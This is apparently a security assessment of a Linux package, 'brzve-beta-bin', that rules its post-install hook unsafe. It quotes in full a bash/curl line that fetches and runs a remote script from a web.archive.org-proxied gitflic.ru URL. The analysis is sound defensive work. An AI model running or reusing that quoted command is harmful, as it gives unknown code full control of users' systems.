<security_assessment>
<decision>UNSAFE</decision>
<details>
The `brzve-beta-bin.install` file contains a malicious post-install hook that downloads and executes a remote script without user consent. The line `bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)` uses process substitution to fetch and execute shell code directly from an external source. This is a classic supply-chain attack vector, as it allows arbitrary code execution from an untrusted and potentially attacker-controlled location.

The use of `curl | bash` (or its equivalent via process substitution) is inherently dangerous, especially when combined with no checksum verification, no source authentication, and obfuscated URLs (e.g., using web.archive.org as a proxy). The destination domain `gitflic.ru` is unrelated to the package's stated purpose and is hosted under a project named "hellscripter", which strongly suggests malicious intent. This behavior is not standard packaging practice and goes far beyond normal post-install operations.

Such code can exfiltrate sensitive data, install backdoors, or modify system settings without user knowledge. The presence of this execution chain in a package install script makes the entire package untrustworthy.
</details>
